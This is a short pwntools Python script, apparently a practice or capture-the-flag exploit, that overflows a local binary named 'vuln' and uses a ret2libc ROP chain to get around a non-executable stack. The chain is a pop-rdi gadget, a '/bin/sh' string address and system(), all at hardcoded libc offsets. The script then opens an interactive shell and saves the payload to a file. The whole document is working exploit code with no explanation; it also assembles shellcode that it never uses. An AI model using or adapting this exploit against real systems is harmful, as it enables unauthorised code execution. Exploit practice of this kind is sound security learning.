from struct import *
from pwn import *
context(os = "linux", arch = "amd64")
vuln = process("./vuln")
base = 0x00007ffff7de6000
rdi_add = 0x27c3d + base
system = 0x49860 + base
arg = 0x198882 + base
shellcode = asm(shellcraft.sh())
payload = b''
payload += b'A' * 22
payload += p64(rdi_add)
payload += p64(arg)
payload += p64(system)
vuln.sendline(payload)
vuln.interactive()
file = open("nxbit", "wb")
file.write(payload)